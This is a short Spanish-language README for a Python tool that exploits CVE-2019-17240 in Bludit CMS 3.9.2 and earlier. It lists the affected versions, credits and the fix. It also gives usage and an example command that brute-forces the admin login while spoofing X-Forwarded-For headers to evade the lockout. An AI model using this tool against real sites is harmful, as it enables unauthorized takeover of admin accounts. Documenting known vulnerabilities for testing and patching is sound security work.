# Bludit CMS: bypass brute force protection mechanism

- Autor: rastating - https://rastating.github.io/bludit-brute-force-mitigation-bypass/
- Modificación/adaptación: Marcelo Woloszyn
- Versiones afectadas: Bludit CMS <= 3.9.2
- CVE: [2019-17240](https://nvd.nist.gov/vuln/detail/CVE-2019-17240)
- Descripción: permite realizar bypass (eludir) el mecanismo de protección de fuerza bruta de Bludit CMS 3.9.2 o inferior, mediante el uso de diferentes encabezados HTTP X-Forward-For falsificados.
- Solución: actualice a una versión posterior a 3.9.2 o aplique el parche que se encuentra en https://github.com/bludit/bludit/pull/1090

## Uso
```
BluditCMSBypassBruteForceProtectionMechanism.py -t TARGET/HOST -l LOGIN-URL -u USERNAME -w WORDLIST
```

## Ejemplo de utilización
```
./BluditCMSBypassBruteForceProtectionMechanism.py -t http://10.0.0.0 -l /admin/ -u admin -w wordlist.txt
```

## Argumentos
```
-h, --help   show this help message and exit
-t TARGET    Target/Host
-l LOGIN     Login URL
-u USERNAME  Username
-w WORDLIST  Path wordlist
```
